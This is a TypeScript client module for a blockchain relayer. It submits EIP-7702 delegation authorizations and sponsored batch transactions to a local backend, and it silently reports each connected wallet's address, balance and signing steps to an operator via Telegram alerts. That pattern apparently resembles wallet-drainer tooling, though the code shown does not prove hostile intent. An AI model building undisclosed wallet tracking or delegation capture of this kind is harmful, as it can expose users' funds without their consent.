/**
 * Relayer client — calls the Node.js backend relayer.
 * The backend holds the sponsor private key (never in the browser).
 */

const RELAYER_URL = 'http://localhost:3001'

export interface RelayCallInput {
  to: string
  value: string   // wei as string
  data: string
}

export interface RelayResponse {
  success: boolean
  txHash: `0x${string}`
  blockNumber: string
  gasUsed: string
  mode: 'local' | '1shot'
}

export type FrontendAlertType =
  | 'wallet_connected'
  | 'wallet_disconnected'
  | 'delegation_checking'
  | 'delegation_found'
  | 'balance_checked'
  | 'batch_signing'
  | 'batch_submitted'

/**
 * Send a UI event to the backend so Telegram alerts fire.
 * Bot token stays server-side — frontend never sees it.
 */
export async function notify(payload: {
  type: FrontendAlertType
  address?: string
  balance?: string
  chainId?: number | string
  callCount?: number
  nonce?: string
  pendingKey?: string
  implementation?: string
}): Promise<void> {
  try {
    await fetch(`${RELAYER_URL}/notify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    })
  } catch { /* silently ignore — alerts are non-critical */ }
}

/**
 * Send a sponsored batch transaction via the relayer backend.
 */
export async function relayBatch(
  eoaAddress: string,
  calls: RelayCallInput[],
  innerSignature: `0x${string}`
): Promise<RelayResponse> {
  const res = await fetch(`${RELAYER_URL}/relay`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ eoaAddress, calls, innerSignature }),
  })

  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: res.statusText }))
    throw new Error(err.error ?? 'Relay request failed')
  }

  return res.json()
}

/**
 * Submit EIP-7702 delegation authorization via the relayer backend.
 */
export async function relayDelegate(
  eoaAddress: string,
  authorization: unknown
): Promise<{ txHash: `0x${string}`; blockNumber: string; gasUsed: string }> {
  const res = await fetch(`${RELAYER_URL}/relay/delegate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ eoaAddress, authorization }),
  })

  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: res.statusText }))
    throw new Error(err.error ?? 'Delegation relay failed')
  }

  return res.json()
}

/**
 * Check relayer health — sponsor balance, chain, mode.
 */
export async function getRelayerHealth() {
  const res = await fetch(`${RELAYER_URL}/health`)
  if (!res.ok) throw new Error('Relayer not reachable')
  return res.json() as Promise<{
    status: string
    sponsor: string
    sponsorBalance: string
    blockNumber: string
    chainId: string
    mode: 'local' | '1shot'
  }>
}

